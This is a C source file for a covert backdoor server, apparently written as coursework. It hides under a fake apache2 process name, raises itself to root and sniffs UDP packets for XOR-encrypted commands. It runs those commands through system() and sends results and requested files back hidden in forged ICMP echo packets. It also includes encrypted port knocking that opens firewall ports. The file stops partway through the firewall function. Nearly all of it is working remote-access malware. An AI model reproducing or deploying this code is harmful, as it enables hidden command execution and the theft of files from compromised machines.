/****************************************************************************
 Program        : server.c
 Author         : David Wang
 Description    : This program is a complete covert application server
                  Including the following parts:
                  1. Backdoor
                  2. File exfiltration
                  3. Port knocking
                  4. Client authentication
 usage          : server
 Compile command: gcc -Wall server.c -o server -lpcap -lpthread
****************************************************************************/
#include <pcap.h>
#include <ctype.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> 
#include <net/ethernet.h>
#include <netinet/ether.h> 
#include <netinet/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <netinet/udp.h>
#include <sys/time.h>
#include "3des.h"

#define KEY1          "One cannot trust anybody these days!"
#define KEY2          "We are going to change the workd!"
#define KEY3          "So, people hire you to break into their places to make sure no one can break into their places?"
#define MASK          "/usr/sbin/apache2 -k start -DSSL"
#define COMMANDSTART   0xAA55
#define COMMANDEND     0x55AA
#define DATA_LEN       64
#define F_AUTH         0xF8F8     // Flag for authentication packets
#define KEY_AUTH       "Q0F8-V$X" // Key for authentication packets
#define F_SEND         0x3989     // Flag for sending file packets
#ifndef ETHER_HDRLEN 
#define ETHER_HDRLEN   14
#endif
#define F_CER          0x55AA   // Flag for command execution results
#define CONFIGFILE     "/etc/bdserver.conf"     // Config file

// * Structure of an internet header, stripped of all options.
// *
// * This is taken directly from the tcpdump source
// *
// * We declare ip_len and ip_off to be short, rather than u_short
// * pragmatically since otherwise unsigned comparisons can result
// * against negative integers quite easily, and fail in subtle ways.
// * UDP header and data field are added for special use
struct my_ip {
	u_int8_t	ip_vhl;                             /* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
	u_int8_t	ip_tos;                             /* type of service */
	u_int16_t	ip_len;                             /* total length */
	u_int16_t	ip_id;                              /* identification */
	u_int16_t	ip_off;                             /* fragment offset field */
#define	IP_DF 0x4000                                /* dont fragment flag */
#define	IP_MF 0x2000                                /* more fragments flag */
#define	IP_OFFMASK 0x1fff                           /* mask for fragmenting bits */
	u_int8_t	ip_ttl;                             /* time to live */
	u_int8_t	ip_p;                               /* protocol */
	u_int16_t	ip_sum;                             /* checksum */
	struct	in_addr ip_src,ip_dst;                  /* source and dest address */
	struct udphdr udp;                              // UDP header
	unsigned char data[DATA_LEN];                   // UDP Data field
};

struct results_buffer
{
    struct iphdr   IPHeader;
    struct icmphdr ICMPHeader;
    unsigned char data[56];
};

struct knocking
{
	unsigned checksum   :16; // For extra checksum
  	unsigned port       :16; // The knocking port number
   	struct Time              // Knocking info
   	{
   		unsigned hour   : 5;
   		unsigned minute : 6;
   		unsigned second : 6;
   		unsigned dur    :15;
   	} time;
   	unsigned sip        :32; // The port will be opened for this IP only
};

struct p
{
    unsigned char tcp;
    unsigned char udp;
} ports;

char sip[16], dip[16], filter[80];
unsigned char authenticated;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_t thread0;                       // command execution
pthread_t thread3;                       // Thread for sending file to the client
pthread_t thread5;                       // Thread for manimulating iptables
char sf[128],df[128];
char pass[9], command[80];
struct knocking  knock;
unsigned short SOURCE_PORT;   //      port number for sending command
unsigned short DEST_PORT;     //      
unsigned short SPORT_KNOCK;   //      port number used for knocking
unsigned short DPORT_KNOCK;
unsigned short P_AUTH;        //      Source port for authentication packets
unsigned short D_AUTH;        //      Destination port for authentication packets

// Function Prototypes
void       config(void);
void       purifyIP(char *buf);
void       purifyPort(char *buf);
void       purifyPassword(char *buf);
unsigned char isDigit(char *str, int len);
void       BackDoor_callback (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet);
u_int16_t  handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet);
u_char*    handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet);
void       decrypt(unsigned char *buffer, unsigned char *key, unsigned char buf_len, unsigned char key_len);
void*      send_results(void* y);
void*      authentication(void *y);
void*      knocking(void *y);
void*      firewall(void *y);
void*      send_file(void *filename);
void*      commander(void *y);
void*      commander1(void *y);

// Main function
int main(int argc,char **argv)
{
    char *NIC_Card;                          // Ethernet card device pointer
    char Error_Buffer[PCAP_ERRBUF_SIZE];     // Error message buffer for pcap
    bpf_u_int32 net_mask;                    // Subnet mask               
    bpf_u_int32 net_address;                 // Ip address for the ethernet card
    pcap_t* Ethernet_Descriptor;             // Ethernet card descriptor
    struct bpf_program fp;                   // holds compiled program
    pid_t pid;                               // Process ID for daemon
    u_char* args = NULL;
    int p[2];                                // pipe descriptor
    pthread_t thread1;                       // Thread for sending result back to client
    pthread_t thread2;                       // Thread for client IP authentication
    pthread_t thread4;                       // Thread for port knocking
    
    authenticated = 0;

    config();
    
    // Daemonize and camouflage the program
	if ((pid=fork())!=0) exit(0);            // Parent terminates. 1st child continues
	setsid();                                // 1st child becomes session leader
	signal(SIGHUP, SIG_IGN);
	if ((pid=fork())!=0)                     // 1st child exits
	{
		exit(0);                    // 1st child terminates. 2nd child continues
	}
	else                            // 2nd child alive
	{
	    strcpy(argv[0], MASK);      // Mask the process name
    	setuid(0);                  // Change UID/GID to 0 (Raise priviliges)
	    setgid(0);
		close(0);                   // Close stdin
		close(1);                   // close stdout
		close(2);                   // close stderr
		pipe(p);                    // create a pipe between 0 and 1
		open("/dev/null",O_RDWR);   // redirect stderr to /dev/null
	}
    
    pthread_create (&thread1, NULL, send_results, NULL);
    //pthread_detach (thread1);
    pthread_create (&thread2, NULL, authentication, NULL);
    //pthread_detach (thread2);
    pthread_create (&thread4, NULL, knocking, NULL);
    //pthread_detach (thread4);
    
    // find the first available Ethernet card and sniff packets from it 
    NIC_Card = pcap_lookupdev(Error_Buffer);
    if (NIC_Card == NULL)
    { 
        printf("%s\n",Error_Buffer); 
        exit(1);
    }
    
    // Use pcap to get the IP address and subnet mask of the device 
    pcap_lookupnet (NIC_Card, &net_address, &net_mask, Error_Buffer);
    
    // Open the device for packet captureset and set it in non-promiscuous mode 
    Ethernet_Descriptor = pcap_open_live (NIC_Card, BUFSIZ, 0, -1, Error_Buffer);
    if (Ethernet_Descriptor == NULL)
    { 
        printf("pcap_open_live(): %s\n",Error_Buffer); 
        exit(1); 
    }
    
    // Compile the filter expression
    if (pcap_compile (Ethernet_Descriptor, &fp, filter, 0, net_address) == -1)
    { 
        fprintf(stderr,"Error calling pcap_compile\n"); 
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (Ethernet_Descriptor, &fp) == -1)
    { 
        fprintf(stderr,"Error setting filter\n"); 
        exit(1); 
    }
    
    // Start the capture session , capture packets forever
    pcap_loop (Ethernet_Descriptor, -1, BackDoor_callback, args);
    
    return 0;
}

/****************************************************************************
Function    :  handle_ethernet
REVISIONS   :  
DESIGNERS   :  Based on the code taken from tcpdump source, namely the following files..
               print-ether.c
               print-ip.c
               ip.h
Inteface    :  u_int16_t handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
               u_char *args                      : User-defined pointer
               iconst struct pcap_pkthdr* pkthdr : Packet header defined pcap
               const u_char* packet              : Packet data
Description :  The function will handle ethernet packet
Returns     :  ethernet type
****************************************************************************/
u_int16_t handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    	u_int caplen = pkthdr->caplen;
    	struct ether_header *eptr;  /* net/ethernet.h */
    	u_short ether_type;

    	if (caplen < ETHER_HDRLEN)
    	{
        	return -1;
    	}

    	// Start with the Ethernet header... 
    	eptr = (struct ether_header *) packet;
    	ether_type = ntohs(eptr->ether_type);

    	return ether_type;
}

/****************************************************************************
Function    :  BackDoor_callback
REVISIONS   :  
DESIGNERS   :  Based on the code taken from tcpdump source, namely the following files..
               print-ether.c
               print-ip.c
               ip.h
Inteface    :  void BackDoor_callback (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet)
               u_char *args                      : User-defined pointer
               iconst struct pcap_pkthdr* pkthdr : Packet header defined pcap
               const u_char* packet              : Packet data
Description :  The function will check all the headers in the Ethernet frame
Returns     :  none
****************************************************************************/
void BackDoor_callback (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
    u_int16_t type = handle_ethernet(args,pkthdr,packet);

    if(type == ETHERTYPE_IP)                  // handle the IP packet
    {
        handle_IP(args,pkthdr,packet);
    }
    else if (type == ETHERTYPE_ARP)           // handle the ARP packet 
    {
    }
    else if (type == ETHERTYPE_REVARP)        // handle reverse arp packet 
    {
    }
}

/****************************************************************************
Function    :  encrypt
REVISIONS   :  
Parameters  :  unsigned char *buffer : Input/Output buffer
               unsigned char *key    : Key buffer
               unsigned char buf_len : Input/Output buffer length
               unsigned char key_len : Key length
Description :  This function is used to encrypt the content of input buffer with
               the key. The encryption algorithm is just XOR the imput string with
               the provided key string.
Returns     :  None
****************************************************************************/
void encrypt(unsigned char *buffer, unsigned char *key, unsigned char buf_len, unsigned char key_len)
{
	unsigned char i,j;
	unsigned char Buf[buf_len];
	unsigned char Key[key_len];
	
	j = 0;
	bzero(Buf,sizeof(Buf));
	bzero(Key,sizeof(Key));
	bcopy(buffer,Buf,buf_len);
	bcopy(key,Key,key_len);
	
	for(i=0;i<buf_len;i++)
	{
		Buf[i] ^= Key[j++];
		if(j == key_len) j = 0;
	}
	
	bcopy(Buf,buffer,buf_len);
}

/****************************************************************************
Function    :  decrypt
REVISIONS   :  
Parameters  :  unsigned char *buffer : Input/Output buffer
               unsigned char *key    : Key buffer
               unsigned char buf_len : Input/Output buffer length
               unsigned char key_len : Key length
Description :  This function is used to decrypt the content of input buffer with
               the key. The decryption algorithm is just XOR the imput string with
               the provided key string.
Returns     :  None
****************************************************************************/
void decrypt(unsigned char *buffer, unsigned char *key, unsigned char buf_len, unsigned char key_len)
{
	unsigned char i,j;
	unsigned char Buf[buf_len];
	unsigned char Key[key_len];
	
	j = 0;
	bzero(Buf,sizeof(Buf));
	bzero(Key,sizeof(Key));
	bcopy(buffer,Buf,buf_len);
	bcopy(key,Key,key_len);
	
	for(i=0;i<buf_len;i++)
	{
		Buf[i] ^= Key[j++];
		if(j == key_len) j = 0;
	}
	
	bcopy(Buf,buffer,buf_len);
}

/* clipped from ping.c (this function is the whore of checksum routines */
/* as everyone seems to use it..I feel so dirty...) */

/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/
/****************************************************************************
Function    :  in_chsum
DATE        :  
REVISIONS   :  
Inteface    :  unsigned short in_cksum(unsigned short *ptr, int nbytes)
               unsigned short *ptr : Data source
               int nbytes          : Size of data source
Description :  This function is used to calculate the checksum of a header or a packet
Returns     :  Checksum value
****************************************************************************/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long		sum;		// assumes long == 32 bits
	u_short			oddbyte;
	register u_short	answer;		// assumes u_short == 16 bits

     // Our algorithm is simple, using a 32-bit accumulator (sum),
	 // we add sequential 16-bit words to it, and at the end, fold back
	 // all the carry bits from the top 16 bits into the lower 16 bits.
	 

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

				            // mop up an odd byte, if necessary
	if (nbytes == 1) {
		oddbyte = 0;		// make sure top half is zero
		*((u_char *) &oddbyte) = *(u_char *)ptr;   // one byte only 
		sum += oddbyte;
	}

	// Add back carry outs from top 16 bits to low 16 bits.

	sum  = (sum >> 16) + (sum & 0xffff);	// add high-16 to low-16
	sum += (sum >> 16);			            // add carry
	answer = ~sum;		                    // ones-complement, then truncate to 16 bits
	return(answer);
}

/****************************************************************************
Function    :  host_convert
DATE        :  11-15-96
REVISIONS   :  
PROGRAMMER  :  Craig H. Rowland
Inteface    :  unsigned int host_convert(char *hostname)
               char *hostname : The host name string
Description :  This function is used to convert a host name string to an integer
Returns     :  converted value
****************************************************************************/
unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   char feedback[80];
   
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         bzero(feedback, 80);
         sprintf(feedback, "Host name %s cannot be resolved.\n", hostname);
         write(1, feedback, strlen(feedback));
         exit(-1);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}

/****************************************************************************
Function    :  handle_IP
REVISIONS   :  
DESIGNERS   :  Based on the code taken from tcpdump source, namely the following files..
               print-ether.c
               print-ip.c
               ip.h
Inteface    :  u_char* handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
               u_char *args                      : User-defined pointer
               iconst struct pcap_pkthdr* pkthdr : Packet header defined pcap
               const u_char* packet              : Packet data
Description :  The function will parse the IP header, UDP header and UDP data, decrypt data embedded in
               UDP payload and excute the command.
Returns     :  NULL pointer
****************************************************************************/
u_char* handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len, temp;
    unsigned char data[DATA_LEN];
    unsigned char key1[sizeof(KEY1)];
    unsigned char key2[sizeof(KEY2)];
    unsigned char key3[sizeof(KEY3)];
    u_int16_t flag;
    char name[80];
    
    // Jump past the Ethernet header 
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length -= sizeof(struct ether_header); 

    // make sure that the packet is of a valid length 
    if (length < sizeof(struct my_ip)) return NULL;

    len     = ntohs(ip->ip_len);
    hlen    = IP_HL(ip); 	// get header length 
    version = IP_V(ip);	    // get the IP version number

    // verify version 
    if(version != 4) return NULL;

    // verify the header length */
    if(hlen < 5 ) return NULL;

    // Ensure that we have as much of the packet as we should 
    if (length != len) return NULL;
    
    // Ensure that the first fragment is present
    off = ntohs(ip->ip_off);
    if ((off & 0x1fff) != 0 ) 	return NULL;
    
    // Ensure that the UDP source/destination port and packet length is correct
    if (ip->udp.source != htons(SOURCE_PORT))  return NULL;
    if (ip->udp.dest   != htons(DEST_PORT))    return NULL;
    if (ip->udp.len    != htons(DATA_LEN + 8)) return NULL;

    bzero((void *)(&data[0]), sizeof(data));
    bcopy((void *)(&(ip->data)), (void *)(&data[0]), sizeof(data));

    // Decrypt data using Triple-XOR algorithm
    bcopy(KEY3,key3,sizeof(KEY3));
	decrypt(data, key3, sizeof(data), sizeof(KEY3));
    bcopy(KEY2,key2,sizeof(KEY2));
	decrypt(data, key2, sizeof(data), sizeof(KEY2));
    bcopy(KEY1,key1,sizeof(KEY1));
	decrypt(data, key1, sizeof(data), sizeof(KEY1));

	// Ensure the packet has header and footer in payload
    bcopy((void *)data, (void *)(&flag), 2);
    if (flag != COMMANDSTART) return NULL;    
    bcopy((void *)(&(data[62])), (void *)(&flag), 2);
    if (flag != COMMANDEND) return NULL;

    // Exit the program : controlled by remote machine
    if(!strncmp((char *)&(data[2]), "bye!", 4))
	{
	    write(1, "Server terminated by remote client.\n", 36);
	    usleep(10000);
		exit(0);
	}
	// Download a file specified by client
    if(!strncmp((char *)&(data[2]), "get ", 4))
	{
	    bzero(name,80);
	    strncpy(name,(char *)&(data[6]),strlen((char *)&(data[6])));
	    sleep(1);
	    pthread_create (&thread3, NULL, send_file, (void *)&(name[0]));
	    pthread_detach (thread3);
		return NULL;
	}
	// Change default directory
	if(!strncmp((char *)&(data[2]), "cd ", 3))
	{
	    bzero(name,80);
	    strncpy(name,(char *)&(data[5]),strlen((char *)&(data[5])));
	    temp = chdir(name);
	    if(temp) write(1, "Directory not found.\n", 21);
	    else write(1, "Directory changed successfully.\n", 32);
	    return NULL;
	}

    bzero(command,80);
    strcpy(command, (char *)&(data[2]));
	pthread_create (&thread0, NULL, commander, NULL);
    pthread_detach (thread0);
    return NULL;
}

void* commander(void *y)
{
    int temp;
    temp = system((char *)(&command));// Execute the command embedded in the data field
	if(temp) write(1, "Command cannot be executed.\n", 29);
	return NULL;
}

/****************************************************************************
Function    :  send_results (thread function)
REVISIONS   :  
Inteface    :  void* send_results(void* y)
               void* y : NULL pointer
Description :  Sending command execution results back to the client
****************************************************************************/
void* send_results(void* y)
{
    int sd;
    int nbytes;
    char buf[56];                  // buffer for client data
    int on = 1;
    short int seq;
    struct results_buffer rb;
    struct sockaddr_in sin;
    unsigned char key1[sizeof(KEY1)];
    unsigned char key2[sizeof(KEY2)];
    unsigned char key3[sizeof(KEY3)];

    // Forge IP header
    rb.IPHeader.ihl      = 5;
    rb.IPHeader.version  = 4;
    rb.IPHeader.tos      = 0;
    rb.IPHeader.tot_len  = htons(28 + 56);
    rb.IPHeader.id       = F_CER; 
    rb.IPHeader.frag_off = 0;
    rb.IPHeader.ttl      = 64;
    rb.IPHeader.protocol = IPPROTO_ICMP;
    rb.IPHeader.check    = 0;

    // Forge icmp header
	rb.ICMPHeader.type = 0;
	rb.ICMPHeader.code = 8;
	seq = 0;
	rb.ICMPHeader.un.echo.id = htons(0x55AA);
	rb.ICMPHeader.un.echo.sequence = htons(seq);
    rb.ICMPHeader.checksum  = 0;
    
    while(1)
    {
        sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        //sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
        setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    
        bzero(buf, 56);
        nbytes = read(0, &buf, 56);
                    
        pthread_mutex_lock(&mutex); //////////// mutex area begin
        
        rb.IPHeader.saddr    = host_convert(sip);
        rb.IPHeader.daddr    = host_convert(dip);
        
        pthread_mutex_unlock(&mutex); /////////////// mutex area end
        
        rb.IPHeader.check    = in_cksum((unsigned short *)&rb.IPHeader, 20);
        
        // Drop our forged data into the socket struct
        sin.sin_family = AF_INET;
        sin.sin_port = 0;
        sin.sin_addr.s_addr = rb.IPHeader.daddr;
        
        bcopy(KEY1,key1,sizeof(KEY1));
        encrypt((void *)&buf, key1, 56, sizeof(KEY1));
        bcopy(KEY2,key2,sizeof(KEY2));
        encrypt((void *)&buf, key2, 56, sizeof(KEY2));
        bcopy(KEY3,key3,sizeof(KEY3));
        encrypt((void *)&buf, key3, 56, sizeof(KEY3));
	            	
        bzero(rb.data,56);
        bcopy(buf,rb.data,56);
        
        seq++;
        if(seq == 1000) seq = 1;
        
        rb.ICMPHeader.un.echo.sequence = 0;
        rb.ICMPHeader.un.echo.sequence = htons(seq);
        rb.ICMPHeader.checksum = 0;
        rb.ICMPHeader.checksum = in_cksum((unsigned short *)(&rb.ICMPHeader.type), 64);
        
        sendto(sd, &rb, 84, 0, (struct sockaddr *)&sin, sizeof(sin));

        close(sd);
        usleep(10000);
    }
    
    return NULL;
}

/****************************************************************************
Function    :  authentication (thread function)
REVISIONS   :  
Inteface    :  void* send_results(void* y)
               void* y : NULL pointer
Description :  This function is used to authenticate the client ip
****************************************************************************/
void* authentication(void *y)
{
    int recv_socket;
    unsigned char  con[8], con1[8], key[8];;
    struct in_addr src, dest;
    char *temp, feedback[80];
    
    struct Auth_buffer
    {
        struct iphdr  IPHeader;
        struct tcphdr TCPHeader;
    } abuf;

    while(1)
    {
        recv_socket = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
        read(recv_socket, &abuf, 40);
        if (abuf.IPHeader.id       == ntohs(F_AUTH)       &&
            abuf.IPHeader.protocol == IPPROTO_TCP         &&
            abuf.TCPHeader.dest    == ntohs(D_AUTH)       &&
            abuf.TCPHeader.source  == P_AUTH              &&
            abuf.TCPHeader.syn     == 1)
        {
            bzero(con, 8);
            bzero(con1,8);
            bzero(key,8);

            bcopy(&(abuf.TCPHeader.seq),     &(con[0]), 4);
            bcopy(&(abuf.TCPHeader.ack_seq), &(con[4]), 4);
            
            strncpy((char *)key, KEY_AUTH, 8);
            
            T_DES(con, con1, key, 0);

            bcopy(&(con1[0]), &(abuf.TCPHeader.seq),     4);
            bcopy(&(con1[4]), &(abuf.TCPHeader.ack_seq), 4);
            
            pthread_mutex_lock(&mutex);
            
            bzero(sip,16);
            bzero(dip,16);
            
            bcopy(&(abuf.TCPHeader.seq), &src, 4);
            bcopy(&(abuf.TCPHeader.ack_seq), &dest, 4);
            
            temp = inet_ntoa(src);
            strcpy(dip,temp);
            temp = inet_ntoa(dest);
            strcpy(sip,temp);
            authenticated = 1;
            
            bzero(feedback,80);
            sprintf(feedback, "Client IP -> %s has been authenticated successfully!\n", dip);
            write(1, feedback, strlen(feedback));
            bzero(feedback,80);
            sprintf(feedback, "If you have changed your machine, you need to re-authenticate your IP!\n");
            write(1, feedback, strlen(feedback));
            bzero(feedback,80);
            sprintf(feedback, "Server IP -> %s is correct.\n", sip);
            write(1, feedback, strlen(feedback));
                      
            pthread_mutex_unlock(&mutex);
        }
        close(recv_socket);
    }
}

/****************************************************************************
Function    :  send_file (thread function)
REVISIONS   :  
Inteface    :  void* send_file(void *filename)
               void *filename : file name string
Description :  This function is used to exfiltrate files frem server
****************************************************************************/
void* send_file(void *filename)
{
    int sd;
    int nbytes;
    char buf[56];                  // buffer for client data
    int on = 1;
    struct results_buffer sb;
    struct sockaddr_in sin;
    short int seq;
    unsigned char key1[sizeof(KEY1)];
    unsigned char key2[sizeof(KEY2)];
    unsigned char key3[sizeof(KEY3)];
    unsigned long count = 0;  // Packet sent counter
    FILE *file;
    
    file = fopen((char *)filename,"rb");
    if(file == NULL){
    	write(1, "Opps! File not found.\n", 22);
    	return NULL;
    }
    
    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    
    // Forge IP header
    sb.IPHeader.ihl      = 5;
    sb.IPHeader.version  = 4;
    sb.IPHeader.tos      = 0;
    sb.IPHeader.tot_len  = htons(28 + 56);
    sb.IPHeader.id       = htons(F_SEND); 
    sb.IPHeader.frag_off = 0;
    sb.IPHeader.ttl      = 128;
    sb.IPHeader.protocol = IPPROTO_ICMP;
    sb.IPHeader.check    = 0;

    sb.IPHeader.check    = in_cksum((unsigned short *)&sb.IPHeader, 20);
    
    pthread_mutex_lock(&mutex);
    sb.IPHeader.saddr    = host_convert(sip);
    sb.IPHeader.daddr    = host_convert(dip);
    pthread_mutex_unlock(&mutex);
    
    seq = 0;
    sb.ICMPHeader.un.echo.id = htons(0xAA55);
	sb.ICMPHeader.un.echo.sequence = htons(seq);
    sb.ICMPHeader.checksum  = 0;
    
    // Drop our forged data into the socket struct
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = sb.IPHeader.daddr;

    while(!feof(file))
    {
        bzero(buf, 56);
        nbytes = fread(buf, 1, 56, file);

        bcopy(KEY1,key1,sizeof(KEY1));
        encrypt((void *)buf, key1, 56, sizeof(KEY1));
        bcopy(KEY2,key2,sizeof(KEY2));
        encrypt((void *)buf, key2, 56, sizeof(KEY2));
        bcopy(KEY3,key3,sizeof(KEY3));
        encrypt((void *)buf, key3, 56, sizeof(KEY3));

        bzero(sb.data,56);
        bcopy(buf,sb.data,56);
        
        // Forge icmp header
	    sb.ICMPHeader.type = 8;
    	sb.ICMPHeader.code = nbytes;
    	
    	seq++;
        if(seq == 1000) seq = 1;
        
        sb.ICMPHeader.un.echo.sequence = 0;
        sb.ICMPHeader.un.echo.sequence = htons(seq);
        
        sb.ICMPHeader.checksum  = 0;
        sb.ICMPHeader.checksum  = in_cksum((unsigned short *)&sb.ICMPHeader, 8 + 56);
        
        sendto(sd, &sb, 28 + 56, 0, (struct sockaddr *)&sin, sizeof(sin));
        count++;
        usleep(100000);
    }
    
    bzero(buf, 56);
    sprintf(buf,"ENDendEND");
    bcopy(&count, &(buf[9]), sizeof(unsigned long));

    bcopy(KEY1,key1,sizeof(KEY1));
    encrypt((void *)buf, key1, 56, sizeof(KEY1));
    bcopy(KEY2,key2,sizeof(KEY2));
    encrypt((void *)buf, key2, 56, sizeof(KEY2));
    bcopy(KEY3,key3,sizeof(KEY3));
    encrypt((void *)buf, key3, 56, sizeof(KEY3));

    bzero(sb.data,56);
    bcopy(buf,sb.data,56);
        
    // Forge icmp header
	sb.ICMPHeader.type = 8;
    sb.ICMPHeader.code = 88;
    	
    seq++;
    if(seq == 1000) seq = 1;
       
    sb.ICMPHeader.un.echo.sequence = 0;
    sb.ICMPHeader.un.echo.sequence = htons(seq);
        
    sb.ICMPHeader.checksum  = 0;
    sb.ICMPHeader.checksum  = in_cksum((unsigned short *)&sb.ICMPHeader, 8 + 56);
        
    sendto(sd, &sb, 28 + 56, 0, (struct sockaddr *)&sin, sizeof(sin));
    usleep(100000);
    close(sd);
    fclose(file);

    pthread_exit(NULL);
    return NULL;
}

/****************************************************************************
Function    :  knocking (thread function)
REVISIONS   :  
Inteface    :  void* knocking(void *y)
               void* y : NULL pointer
Description :  This function is used to accept port knocking
****************************************************************************/
void* knocking(void *y)
{
    int recv_socket, tt;
    unsigned char desbuf[8],tmp[8];
    char feedback[80], password[9];
    unsigned short check;
    char ip[16], *w;
    struct in_addr addr;
    
    struct Auth_buffer
    {
        struct iphdr  IPHeader;
        struct tcphdr TCPHeader;
    } packet;

    
    while(1)
    {
        recv_socket = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
        bzero((char *)&packet,40);
        read(recv_socket, &packet, 40);
        
        // Screening packets
        if (packet.IPHeader.protocol  == IPPROTO_TCP         &&
            packet.TCPHeader.dest     == ntohs(DPORT_KNOCK)  &&
            packet.TCPHeader.source   == ntohs(SPORT_KNOCK)  &&
            packet.TCPHeader.syn      == 1                   &&
            packet.TCPHeader.fin      == 0                   &&
            packet.TCPHeader.ack      == 0                   &&
            packet.TCPHeader.rst      == 0                   &&
            packet.TCPHeader.psh      == 0                   &&
            packet.TCPHeader.urg      == 0                   &&
            packet.TCPHeader.ece      == 0                   &&
            packet.TCPHeader.cwr      == 0                   &&
            packet.TCPHeader.doff     == 5                   &&
            packet.TCPHeader.urg_ptr  == 0                   &&
            packet.TCPHeader.res1     != 0                   &&
            packet.IPHeader.frag_off  == 0                   &&
            packet.IPHeader.saddr     == packet.TCPHeader.seq
            )
        {
            bzero((char*)&knock, 12);

            // Fill the knock struct
            knock.port = ntohs(packet.TCPHeader.window);
            knock.checksum = packet.IPHeader.id;
            bcopy((char *)&(packet.IPHeader.saddr), (char *)&(knock.time), 32);
            knock.sip = packet.TCPHeader.ack_seq;

            bcopy(pass, password,9);
            bzero(desbuf,8);
            T_DES((unsigned char *)&knock, desbuf, (unsigned char *)&password, 0);
            bcopy(desbuf, (unsigned char *)&knock, 8);
            bzero(desbuf,8);
            bzero(tmp,8);
            bcopy((unsigned char *)(&knock+8),tmp,4);
            T_DES(tmp, desbuf, (unsigned char *)&password, 0);
            bcopy(&(desbuf[8]), (unsigned char *)(&knock+8), 4);
            
            bzero(ip,16);
            tt = knock.sip;
            bcopy((char *)&tt, &addr, 4);
            w = inet_ntoa(addr);
            strncpy(ip, w, strlen(w));
            
            switch(packet.TCPHeader.res1)  // Determine the protocol
            {
                case 10: ports.tcp = 1;
                         ports.udp = 1;
                         break;
                case  8: ports.tcp = 1;
                         ports.udp = 0;
                         break;
                case  2: ports.udp = 1;
                         ports.tcp = 0;
                         break;
                default: ports.udp = 0;
                         ports.tcp = 0;
                         break;
            }
            
            // Check the checksum
            check = knock.checksum;
            knock.checksum = 0;
            if(in_cksum((unsigned short *)&knock, 12) != check){
                bzero(feedback, 80);
                sprintf(feedback, "Wrong checksum! Should be 0x%x.\n", check);
                write(1, feedback, strlen(feedback));
                continue;
            }

            pthread_create (&thread5, NULL, firewall, NULL);
            pthread_detach(thread5);
        }
        close(recv_socket);
    }
    
    
    return NULL;
}

void* commander1(void *y)
{
    int temp;
    char feedback[80];
    
    temp = system((char *)(&command));// Execute the command embedded in the data field
	if(temp) write(1, "Command cannot be executed.\n", 29);
	bzero(feedback, 80);
    sprintf(feedback, "====================================> Time is up.\n");
    write(1, feedback, strlen(feedback));
	return NULL;	
}

/****************************************************************************
Function    :  firewall (thread function)
REVISIONS   :  
Inteface    :  void* firewall(void *y)
               void* y : NULL pointer
Description :  This function is used to modify the firewall rules
****************************************************************************/
void* firewall(void *y)
{
    char ip[16], *w, feedback[80], str[200];
    struct timeval start_time, now;
    struct in_addr addr;
    struct tm *ti;
    time_t temp;
    int tt;

    //pthread_mutex_lock(&mutex);
    
    // convert the ip address to dotted-decimal format
    bzero(ip, 16);
    tt = knock.sip;
    bcopy((char *)&tt, &addr, 4);
    w = inet_ntoa(addr);
    strncpy(ip, w, strlen(w));
    
    // preparing timer
    gettimeofday(&now, NULL);
    ti = localtime(&(now.tv_sec));
    ti->tm_hour = knock.time.hour;
    ti->tm_min  = knock.time.minute;
    ti->tm_sec  = knock.time.second;
    temp = mktime(ti);
    start_time.tv_sec  = temp;
    start_time.tv_usec = 0;

    // wait til time up
    while (1){
        gettimeofday(&now, NULL);
        if(timercmp(&start_time, &now, >)){
            sleep(1);
            continue;
        }
        break;
    }
    
    bzero(feedback, 80);
    sprintf(feedback, "Firewall rule undated.\n");
    write(1, feedback, strlen(feedback));
            
    // Forge command line and open the port
    if(ports.tcp && ports.udp){
        bzero(str, 200);
